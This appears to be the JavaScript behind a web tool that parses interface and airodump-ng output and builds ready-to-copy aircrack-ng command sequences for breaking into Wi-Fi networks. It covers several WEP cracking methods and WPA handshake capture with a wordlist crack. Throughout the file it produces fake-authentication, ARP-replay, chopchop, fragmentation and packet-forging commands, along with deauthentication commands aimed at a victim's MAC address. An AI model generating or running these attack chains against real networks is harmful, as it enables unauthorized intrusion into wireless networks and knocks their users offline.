function openTab(evt, cityName) {
  // Declare all variables
  var i, tabcontent, tablinks;

  // Get all elements with class="tabcontent" and hide them
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }

  // Get all elements with class="tablinks" and remove the class "active"
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }

  // Show the current tab, and add an "active" class to the button that opened the tab
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
} 

function copyLine(thing) {
	var text = thing.parentElement.innerText
	//alert(text)
    copyTextToClipboard(text)
} 

function copyTextToClipboard(text) {
  var textArea = document.createElement("textarea");

  //
  // *** This styling is an extra step which is likely not required. ***
  //
  // Why is it here? To ensure:
  // 1. the element is able to have focus and selection.
  // 2. if element was to flash render it has minimal visual impact.
  // 3. less flakyness with selection and copying which **might** occur if
  //    the textarea element is not visible.
  //
  // The likelihood is the element won't even render, not even a
  // flash, so some of these are just precautions. However in
  // Internet Explorer the element is visible whilst the popup
  // box asking the user for permission for the web page to
  // copy to the clipboard.
  //

  // Place in top-left corner of screen regardless of scroll position.
  textArea.style.position = 'fixed';
  textArea.style.top = 0;
  textArea.style.left = 0;

  // Ensure it has a small width and height. Setting to 1px / 1em
  // doesn't work as this gives a negative w/h on some browsers.
  textArea.style.width = '2em';
  textArea.style.height = '2em';

  // We don't need padding, reducing the size if it does flash render.
  textArea.style.padding = 0;

  // Clean up any borders.
  textArea.style.border = 'none';
  textArea.style.outline = 'none';
  textArea.style.boxShadow = 'none';

  // Avoid flash of white box if rendered for any reason.
  textArea.style.background = 'transparent';


  textArea.value = text;

  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();

  try {
    var successful = document.execCommand('copy');
    var msg = successful ? 'successful' : 'unsuccessful';
    console.log('Copying text command was ' + msg);
  } catch (err) {
    console.log('Oops, unable to copy');
  }

  document.body.removeChild(textArea);
}

function searchCommand() {
	var ipLinkShowInput = document.getElementById("ipLinkShowInput").value.trim().replace(/\s\s+/g, ' ');
	
	var ipSplit = ipLinkShowInput.split(" ");
	var deviceName = ipSplit[1];
	deviceName = deviceName.substring(0, deviceName.length - 1);
	document.getElementById("searchCommand").innerHTML = sudo() + `airodump-ng ${deviceName}` + '<img src="copy.png" onclick="copyLine(this)">'
}
	
function myFunction() {
	var airodumpInput = document.getElementById("airodumpInput").value.trim().replace(/\s\s+/g, ' ');
	var ipLinkShowInput = document.getElementById("ipLinkShowInput").value.trim().replace(/\s\s+/g, ' ');
	var victimMac = document.getElementById("victimMAC").value;
	
	var airoSplit = airodumpInput.split(" ");
	var apMac = airoSplit[0];
	var channel = airoSplit[5];
	var ssid = airoSplit[airoSplit.length - 1];
	
	var ipSplit = ipLinkShowInput.split(" ");
	var deviceName = ipSplit[1];
	deviceName = deviceName.substring(0, deviceName.length - 1);
	var mac = ipSplit[16].toUpperCase()
		
	document.getElementById("classicWEPoutput").innerHTML = 
		"<table style='width:100%'>"
		+ preamble() + screenSetup(ssid) + postamble()
		+ preamble() + setup() + postamble()
		+ preamble() + monitorMode(deviceName, channel) + postamble()
		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble()
		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble()
		+ "</table>";
		
	document.getElementById("clientlessWEPoutput").innerHTML = 
		"<table style='width:100%'>"
		+ preamble() + screenSetup(ssid) + postamble()
		+ preamble() + setup() + postamble()
		+ preamble() + monitorMode(deviceName, channel) + postamble()
		+ '<tr><td colspan="3">' + captureCommand(deviceName, channel, apMac, ssid)+ postamble() 
		+ '<tr><td colspan="3">' + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName)
		 + copyButton() + "</td><td>" + replayAnyAttack(apMac, mac, deviceName) + postamble()   
		+ '<tr><td colspan="2">' + packetForge(apMac, mac, deviceName) + copyButton() + "</td><td>SKIP THIS STEP</tr></td>"
		+ '<tr><td colspan="2">' + replayAttack(deviceName) + copyButton() + "</td><td>SKIP THIS STEP"        
		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble()
		+ "</table>";
		
	document.getElementById("wepViaClientOutput").innerHTML = 
		"<table style='width:100%'>"
		+ preamble() + screenSetup(ssid) + postamble()
		+ preamble() + setup() + postamble()
		+ preamble() + monitorMode(deviceName, channel) + postamble()
		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
		+ preamble() + packetReplayAttack(apMac, deviceName) + postamble()
		+ preamble() + sudo() + "aircrack-ng -z `ls -t "+ssid+"*.cap | head -1`" + postamble();
		+ "</table>";
		
	document.getElementById("sharedKeyWEPoutput").innerHTML = 
		"<table style='width:100%'>"
		+ preamble() + screenSetup(ssid) + postamble()
		+ preamble() + setup() + postamble()
		+ preamble() + monitorMode(deviceName, channel) + postamble()
		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
		+ preamble() + fakeAuthSK(ssid, apMac, mac, deviceName) + postamble() 
		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble() 
		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble();
		+ "</table>";
		
	document.getElementById("wpaOutput").innerHTML = 
		"<table style='width:100%'>"
		+ preamble() + screenSetup(ssid) + postamble()
		+ preamble() + setup() + postamble()
		+ preamble() + monitorMode(deviceName, channel) + postamble()
		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
		+ preamble() + sudo() + "aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t "+ssid+"*.cap | head -1`" + postamble();
		+ "</table>";
}

function screenSetup(wifi) {
	return `screen -S ${wifi}`
}

function sudo() {
	if (document.getElementById("useSudo").checked) {
		return "sudo "
	} else {
		return ""
	}
}

function preamble() {
	return "<tr><td>";
}

function copyButton() {
	return '<img src="copy.png" onclick="copyLine(this)">'
}

function postamble() {
	return copyButton() + "</tr></td>";
}

function setup() {
	return sudo() + "airmon-ng check kill; " + sudo() + "airmon-ng check kill";
}

function captureCommand(device, channel, ssid, netName) {
	return sudo() + `airodump-ng ${device} -c ${channel} --bssid ${ssid} -w ${netName}`
}

function monitorMode(device, channel) {
	return sudo() + `iwconfig ${device} mode monitor channel ${channel}` + copyButton() + "</td><td>" + sudo() + `airmon-ng start ${device} ${channel}`
}

function fakeAuth(ssid, apMac, mac, device) {
	return sudo() + `aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
}

function arpRelay(apMac, mac, device) {
	return sudo() + `aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
}

function deauthAttack(apMac, victimMac, device) {
	if (victimMac.length > 0) {
		return sudo() + `aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
	} else {
		return sudo() + `aireplay-ng -0 1 -a ${apMac} ${device}`
	}
}

function chopChopAttack(apMac, mac, device) {
	return sudo() + `aireplay-ng -4 -b ${apMac} -h ${mac} ${device}`
}

function fragmentationAttack(apMac, mac, device) {
	return sudo() + `aireplay-ng -5 -b ${apMac} -h ${mac} ${device}`
}

function packetForge(apMac, mac, device) {
	return sudo() + `packetforge-ng -0 -a ${apMac} -h ${mac} -l 192.168.1.100 -k 192.168.1.255 -y \`ls -t *.xor | head -1\` -w arpRequest`
}


function replayAttack(device) {
	return sudo() + `aireplay-ng -2 -r arpRequest ${device}`
}

function packetReplayAttack(apMac, device) {
	return sudo() + `aireplay-ng -2 -b ${apMac} -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${device}`
}

function fakeAuthSK(ssid, apMac, mac, device) {
	return sudo() + `aireplay-ng -1 0 -e ${ssid} -y \`ls -t *.xor | head -1\` -a ${apMac} -h ${mac} ${device}`
}

function arpRelay(apMac, mac, device) {
	return sudo() + `aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
}

function deauthAttack(apMac, victimMac, device) {
	if (victimMac.length > 0) {
		return sudo() + `aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
	} else {
		return sudo() + `aireplay-ng -0 1 -a ${apMac} ${device}`
	}
}

function replayAnyAttack(apMac, mac, device) {
	return sudo() + `aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b ${apMac} -h ${mac} ${device}`
}